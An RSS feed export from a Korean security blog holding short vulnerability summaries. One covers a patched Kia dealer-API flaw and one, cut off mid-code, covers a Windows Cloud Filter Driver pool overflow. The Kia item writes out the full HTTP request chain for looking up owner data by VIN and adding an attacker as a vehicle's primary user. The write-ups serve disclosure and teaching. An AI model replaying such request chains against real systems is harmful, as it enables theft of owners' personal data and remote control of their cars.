<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Tue, 01 Oct 2024 08:44:33 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] 기아 차량 원격 제어 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/01/h4mG/kia/</link>
      <guid>https://hackyboiz.github.io/2024/10/01/h4mG/kia/</guid>
      <pubDate>Tue, 01 Oct 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://samcurry.net/hacking-kia&quot;&gt;https://samcurry.net/ha</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://samcurry.net/hacking-kia">https://samcurry.net/hacking-kia</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xAE30;&#xC544; &#xB51C;&#xB7EC; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;(kiaconnect.kdealer.com) API</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2024&#xB144; 6&#xC6D4; 11&#xC77C;, &#xAE30;&#xC544; &#xCC28;&#xB7C9;&#xC5D0;&#xC11C; &#xCC28;&#xB7C9; &#xBC88;&#xD638;&#xD310;&#xB9CC;&#xC73C;&#xB85C; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC744; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCC28;&#xB7C9;&#xC5D0; &#xC7A5;&#xCC29;&#xB41C; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC57D; 30&#xCD08; &#xB0B4;&#xC5D0; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70;, &#xAE30;&#xC544; &#xCEE4;&#xB125;&#xD2B8; &#xAD6C;&#xB3C5;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCC28;&#xB7C9;&#xC5D0;&#xC11C;&#xB3C4; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB984;, &#xC804;&#xD654;&#xBC88;&#xD638;, &#xC774;&#xBA54;&#xC77C;, &#xC9D1; &#xC8FC;&#xC18C;&#xC640; &#xAC19;&#xC740; &#xAC1C;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xC5EC;, &#xD53C;&#xD574;&#xC790; &#xBAB0;&#xB798; &#xCC28;&#xB7C9;&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; &#xB4F1;&#xB85D;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAE30;&#xC544;&#xC758; &#xB0B4;&#xBD80; &#xD328;&#xCE58;&#xB97C; &#xAC70;&#xCCD0; 2024&#xB144; 9&#xC6D4; 26&#xC77C;&#xC5D0; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD08;&#xAE30; &#xD0C0;&#xAC9F;&#xC740; &#xC778;&#xD130;&#xB137;&#xC744; &#xD1B5;&#xD574; &#xCC28;&#xB7C9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; owners.kia.com &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC640; Kia Connect iOS &#xC571;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB294; reverse proxy&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xBA85;&#xB839;&#xC744; &#xAE30;&#xC544; Backend &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xACE0;, &#xBAA8;&#xBC14;&#xC77C; &#xC571;&#xC740; API&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; API &#xC694;&#xCCAD;&#xC774; &#xD504;&#xB85D;&#xC2DC; &#xC11C;&#xBC84;&#xB97C; &#xAC70;&#xCCD0; Backend&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/owners/apigwServlet.html</span> HTTP/2<span class="hljs-attribute">Host</span>: owners.kia.com<span class="hljs-attribute">Httpmethod</span>: GET<span class="hljs-attribute">Apiurl</span>: /door/unlock<span class="hljs-attribute">Servicetype</span>: postLoginCustomer<span class="hljs-attribute">Cookie</span>: JSESSIONID=SESSION_TOKEN;</code></pre><p>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; owners.kia.com &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xCC28;&#xB7C9; &#xC7A0;&#xAE08; &#xD574;&#xC81C;&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;, &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC704;&#xC640; &#xAC19;&#xC740; HTTP &#xC694;&#xCCAD;&#xC774; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xC694;&#xCCAD;&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC138;&#xC158; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xCFE0;&#xD0A4;&#xC5D0; <code>JSESSIONID</code> &#xAC00; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /apigw/v<span class="hljs-number">1</span>/rems/door/unlock HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: api.owners.kia.com<span class="hljs-attribute">Sid</span>: <span class="hljs-number">454817</span>d<span class="hljs-number">4</span>-b<span class="hljs-number">228</span>-<span class="hljs-number">4103</span>-a<span class="hljs-number">26</span>f-<span class="hljs-number">884</span>e<span class="hljs-number">362</span>e<span class="hljs-number">8</span>dee<span class="hljs-attribute">Vinkey</span>: <span class="hljs-number">3</span>ecc<span class="hljs-number">1</span>a<span class="hljs-number">19</span>-aefd-<span class="hljs-number">4188</span>-a<span class="hljs-number">7</span>fe-<span class="hljs-number">1723</span>e<span class="hljs-number">1663</span>d<span class="hljs-number">6</span>e</code></pre><p>&#xC774;&#xD6C4;, &#xD504;&#xB85D;&#xC2DC; &#xC11C;&#xBC84;&#xB294; &#xBC31;&#xC5D4;&#xB4DC; &#xC11C;&#xBC84;&#xB85C; <code>Sid</code> &#xD1A0;&#xD070;&#xACFC; <code>Vinkey</code> &#xAC12;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB294; HTTP &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p><code>Sid</code>&#xC740; &#xC55E;&#xC11C; &#xC804;&#xB2EC;&#xBC1B;&#xC740; <code>JSESSIONID</code>&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC138;&#xC158;&#xC744; &#xC778;&#xC99D; &#xD6C4; &#xC0DD;&#xC131;&#xD55C; &#xD1A0;&#xD070; &#xAC12;&#xC774;&#xBA70;,</p><p><code>Vinkey</code>&#xAC12;&#xC740; &#xCC28;&#xB7C9;&#xC758; VIN(Vehicle Identification Number, &#xCC28;&#xB7C9; &#xC2DD;&#xBCC4; &#xBC88;&#xD638;)&#xC640; &#xC5F0;&#xACB0;&#xB41C; &#xACE0;&#xC720;&#xD55C; UUID&#xC785;&#xB2C8;&#xB2E4;.</p><p>2023&#xB144;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC774;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; &#xCC28;&#xB7C9;&#xC744; &#xAD6C;&#xB9E4;&#xD588;&#xC744; &#xB54C; &#xACE0;&#xAC1D; &#xC815;&#xBCF4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xB294;&#xC9C0;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xACE0;&#xC790; &#xAE30;&#xC544; &#xB51C;&#xB7EC; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>kiaconnect.kdealer.com<span class="hljs-regexp">/content/</span>kDealer<span class="hljs-regexp">/en/</span>kiauser.html?token=dealer_generated_access_token&amp;vin=example_vin&amp;scenarioType=<span class="hljs-number">3</span></code></pre><p>&#xC0C8;&#xB85C; &#xAD6C;&#xB9E4;&#xD55C; &#xCC28;&#xB7C9;&#xC744; &#xB4F1;&#xB85D;&#xD560; &#xB54C;, &#xAE30;&#xC544; &#xB51C;&#xB7EC;&#xB294; &#xACE0;&#xAC1D;&#xC5D0;&#xAC8C; &#xC774;&#xBA54;&#xC77C;&#xB85C; &#xB4F1;&#xB85D; &#xB9C1;&#xD06C;&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. </p><p>&#xC704; &#xC608;&#xC2DC; &#xB9C1;&#xD06C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, <code>token</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xB51C;&#xB7EC;&#xAC00; &#xC0DD;&#xC131;&#xD55C; &#xC77C;&#xD68C;&#xC131; &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC774;&#xBA70;, <code>vin</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xCC28;&#xB7C9; &#xACE0;&#xC720;&#xBC88;&#xD638;(VIN)&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. <code>vin</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC9C0;&#xC815;&#xB41C; &#xCC28;&#xB7C9;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com{  &quot;token&quot;: &quot;985a49f0-1fe5-4d36-860e-d9b93272072b&quot;,  &quot;vin&quot;: &quot;5XYP3DHC9NG310533&quot;,  &quot;scenarioType&quot;: 3,  &quot;loginPref&quot;: null}</code></pre><p>&#xC704; &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; <code>token</code>&#xACFC; <code>vin</code>&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA70;, &#xAE30;&#xC544; &#xB51C;&#xB7EC;&#xC758; &#xC778;&#xD504;&#xB77C;&#xAC00; &#xACE0;&#xAC1D; &#xC815;&#xBCF4;&#xC640; &#xC5F0;&#xACB0;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs kotlin">dealerVehicleLookUp() {    <span class="hljs-keyword">this</span>.displayLoader = !<span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.vinToEnroll = <span class="hljs-string">&quot;eDelivery&quot;</span> != <span class="hljs-keyword">this</span>.entryPoint ? <span class="hljs-keyword">this</span>.vinToEnroll.replace(/\s/g, <span class="hljs-string">&quot;&quot;</span>) : <span class="hljs-keyword">this</span>.userDetails.vin, <span class="hljs-string">&quot;17&quot;</span> == <span class="hljs-keyword">this</span>.vinToEnroll.length &amp;&amp; <span class="hljs-keyword">this</span>.landingPageService.postOffice({        vin: <span class="hljs-keyword">this</span>.vinToEnroll    }, <span class="hljs-string">&quot;/dec/dlr/dvl&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;postLoginCustomer&quot;</span>).subscribe(i =&gt; {        i &amp;&amp; (i.hasOwnProperty(<span class="hljs-string">&quot;body&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;0&quot;</span> == i.body.status.statusCode ? <span class="hljs-keyword">this</span>.processDvlData(i.body) : <span class="hljs-string">&quot;1003&quot;</span> == i.body.status.errorCode &amp;&amp; <span class="hljs-string">&quot;kia-dealer&quot;</span> == <span class="hljs-keyword">this</span>.entryPoint ? <span class="hljs-keyword">this</span>.reRouteSessionExpire() : (<span class="hljs-keyword">this</span>.displayLoader = !<span class="hljs-number">1</span>, <span class="hljs-keyword">this</span>.alertMessage = i.body.status.errorMessage, document.getElementById(<span class="hljs-string">&quot;triggerGeneralAlertModal&quot;</span>).click()))    })}</code></pre><p>&#xB51C;&#xB7EC; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xACB0;&#xACFC;, &#xC9C1;&#xC6D0; &#xC804;&#xC6A9; API &#xD638;&#xCD9C;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; API&#xB294; &#xCC28;&#xB7C9; &#xC870;&#xD68C;, &#xACC4;&#xC815; &#xC870;&#xD68C;, &#xCC28;&#xB7C9; &#xB4F1;&#xB85D; &#xBC0F; &#xD574;&#xC9C0; &#xB4F1; &#xC9C1;&#xC6D0;&#xB9CC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD30C;&#xC545;&#xB418;&#xC5B4; &#xB51C;&#xB7EC; &#xC804;&#xC6A9; API &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC744; &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /prof/registerUser{  &quot;userCredential&quot;: {    &quot;firstName&quot;: &quot;Sam&quot;,    &quot;lastName&quot;: &quot;Curry&quot;,    &quot;userId&quot;: &quot;normal.user@gmail.com&quot;,    &quot;password&quot;: &quot;FakePass123!&quot;,    &quot;acceptedTerms&quot;: 1  }}</code></pre><p>&#xC704; &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xB51C;&#xB7EC; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB4F1;&#xB85D;&#xD55C; &#xD6C4;, &#xB85C;&#xADF8;&#xC778;&#xD558;&#xC5EC; &#xC138;&#xC158; &#xCFE0;&#xD0A4;&#xB97C; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<span class="hljs-attribute">Sid</span>: <span class="hljs-number">123</span>e<span class="hljs-number">4567</span>-e<span class="hljs-number">89</span>b-<span class="hljs-number">12</span>d<span class="hljs-number">3</span>-a<span class="hljs-number">456</span>-<span class="hljs-number">426614174000</span></code></pre><p>&#xC138;&#xC158; &#xCFE0;&#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xC544; &#xB51C;&#xB7EC; API&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xACE0;, &#xCC28;&#xB7C9; &#xC18C;&#xC720;&#xC790;&#xC758; &#xC774;&#xB984;, &#xC774;&#xBA54;&#xC77C;, &#xC804;&#xD654;&#xBC88;&#xD638; &#xB4F1;&#xC758; &#xAC1C;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xC870;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/10/01/h4mG/kia/image.png" alt></p><p>&#xC774;&#xD6C4; &#xCC28;&#xB7C9;&#xC744; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC704;&#xC640; &#xAC19;&#xC774; &#xACF5;&#xACA9; &#xC808;&#xCC28;&#xB97C; &#xAD6C;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>4&#xBC88;&#xC758; HTTP &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xD53C;&#xD574;&#xC790; &#xCC28;&#xB7C9;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC218;&#xC815;&#xD558;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xB97C; &#xC8FC;&#xC694; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; &#xB4F1;&#xB85D;&#xD558;&#xB294; &#xACF5;&#xACA9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-&#xB51C;&#xB7EC;-&#xD1A0;&#xD070;-&#xC0DD;&#xC131;-&#xBC0F;-&#xC138;&#xC158;-&#xD68D;&#xB4DD;"><a href="#1-&#xB51C;&#xB7EC;-&#xD1A0;&#xD070;-&#xC0DD;&#xC131;-&#xBC0F;-&#xC138;&#xC158;-&#xD68D;&#xB4DD;" class="headerlink" title="1.&#xB51C;&#xB7EC; &#xD1A0;&#xD070; &#xC0DD;&#xC131; &#xBC0F; &#xC138;&#xC158; &#xD68D;&#xB4DD;"></a>1.&#xB51C;&#xB7EC; &#xD1A0;&#xD070; &#xC0DD;&#xC131; &#xBC0F; &#xC138;&#xC158; &#xD68D;&#xB4DD;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /prof/authUser{  &quot;userCredential&quot;: {    &quot;userId&quot;: &quot;normal.kia.user@gmail.com&quot;,    &quot;password&quot;: &quot;Fakepass123!&quot;  }}</code></pre><h3 id="2-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC774;&#xBA54;&#xC77C;-&#xBC0F;-&#xC804;&#xD654;&#xBC88;&#xD638;-&#xC870;&#xD68C;"><a href="#2-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC774;&#xBA54;&#xC77C;-&#xBC0F;-&#xC804;&#xD654;&#xBC88;&#xD638;-&#xC870;&#xD68C;" class="headerlink" title="2. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC774;&#xBA54;&#xC77C; &#xBC0F; &#xC804;&#xD654;&#xBC88;&#xD638; &#xC870;&#xD68C;"></a>2. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC774;&#xBA54;&#xC77C; &#xBC0F; &#xC804;&#xD654;&#xBC88;&#xD638; &#xC870;&#xD68C;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Appid</span>: 123e4567-e89b-12d3-a456-426614174000<span class="hljs-attribute">Apiurl</span>: /dec/dlr/dvl{    &quot;vin&quot;: &quot;1HGBH41JXMN109186&quot;}</code></pre><h3 id="3-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC811;&#xADFC;-&#xAD8C;&#xD55C;-&#xC218;&#xC815;"><a href="#3-&#xD53C;&#xD574;&#xC790;&#xC758;-&#xC811;&#xADFC;-&#xAD8C;&#xD55C;-&#xC218;&#xC815;" class="headerlink" title="3. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC811;&#xADFC; &#xAD8C;&#xD55C; &#xC218;&#xC815;"></a>3. &#xD53C;&#xD574;&#xC790;&#xC758; &#xC811;&#xADFC; &#xAD8C;&#xD55C; &#xC218;&#xC815;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /dec/dlr/rvp<span class="hljs-attribute">Appid</span>: 123e4567-e89b-12d3-a456-426614174000{  &quot;vin&quot;: &quot;VIN&quot;,  &quot;loginId&quot;: &quot;victim_email_leaked@gmail.com&quot;,  &quot;dealerCode&quot;: &quot;eDelivery&quot;}</code></pre><h3 id="4-&#xACF5;&#xACA9;&#xC790;&#xB97C;-&#xD53C;&#xD574;&#xC790;-&#xCC28;&#xB7C9;&#xC5D0;-&#xCD94;&#xAC00;"><a href="#4-&#xACF5;&#xACA9;&#xC790;&#xB97C;-&#xD53C;&#xD574;&#xC790;-&#xCC28;&#xB7C9;&#xC5D0;-&#xCD94;&#xAC00;" class="headerlink" title="4. &#xACF5;&#xACA9;&#xC790;&#xB97C; &#xD53C;&#xD574;&#xC790; &#xCC28;&#xB7C9;&#xC5D0; &#xCD94;&#xAC00;"></a>4. &#xACF5;&#xACA9;&#xC790;&#xB97C; &#xD53C;&#xD574;&#xC790; &#xCC28;&#xB7C9;&#xC5D0; &#xCD94;&#xAC00;</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apps/services/kdealer/apigwServlet.html</span> HTTP/1.1<span class="hljs-attribute">Host</span>: kiaconnect.kdealer.com<span class="hljs-attribute">Httpmethod</span>: POST<span class="hljs-attribute">Apiurl</span>: /ownr/dicve<span class="hljs-attribute">Appid</span>: 123e4567-e89b-12d3-a456-426614174000{  &quot;vin&quot;: &quot;5XYRK4LFXMG016215&quot;,  &quot;loginId&quot;: &quot;attacker@gmail.com&quot;}</code></pre><p>&#xC774; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xCC28;&#xB7C9;&#xC758; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC744; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xD53C;&#xD574;&#xC790;&#xB294; &#xC774;&#xB97C; &#xC804;&#xD600; &#xC778;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><iframe width="560" height="315" src="https://www.youtube.com/embed/jMHFCpQdZyg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>2022&#xB144;&#xD615; &#xAE30;&#xC544; EV6 &#xCC28;&#xB7C9;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC601;&#xC0C1;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xAE30;&#xC544; &#xCC28;&#xB7C9;&#xC758; &#xBC88;&#xD638;&#xD310;&#xC744; &#xC785;&#xB825;&#xD558;&#xACE0;, &#xC18C;&#xC720;&#xC8FC; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC628; &#xB4A4; &#xCC28;&#xB7C9;&#xC758; &#xC6D0;&#xACA9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.boannews.com/media/view.asp?idx=133232">https://www.boannews.com/media/view.asp?idx=133232</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/KIA/">KIA</category>
      
      <category domain="https://hackyboiz.github.io/tags/h4mG/">h4mG</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/01/h4mG/kia/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-21310: Microsoft Cloud Filter Driver의 Numeric Truncation으로 인한 Pool Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/28/j0ker/2024-09-28/</link>
      <guid>https://hackyboiz.github.io/2024/09/28/j0ker/2024-09-28/</guid>
      <pubDate>Sat, 28 Sep 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://gabrieldurdiak.github.io/clfd/&quot;&gt;Analysis of</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://gabrieldurdiak.github.io/clfd/">Analysis of CVE-2024-21310 Pool Overflow Windows Cloud Filter Driver</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21310">MSRc Security Updates</a> &#xCC38;&#xACE0;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBA3C;&#xC800; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0;&#xC11C; <a href="https://www.microfocus.com/documentation/filr/filr-4/filr-desktop/t47bx2ogpfz7.html">&#xAE34; &#xACBD;&#xB85C;&#xB97C; &#xD65C;&#xC131;&#xD654;</a>&#xD574;&#xC57C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>NtCreateFile &#xD568;&#xC218;&#xB294; HsmiQueryFullFilePath &#xD568;&#xC218;&#xC5D0; &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">InformationFile = HsmiQueryFullFilePath(v22, v23, Object, <span class="hljs-number">257</span>i64, &amp;PathSize); [<span class="hljs-number">1</span>]      HsmDbgBreakOnStatus((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)InformationFile);      <span class="hljs-keyword">if</span> ( InformationFile &lt; <span class="hljs-number">0</span> )      {        <span class="hljs-keyword">if</span> ( 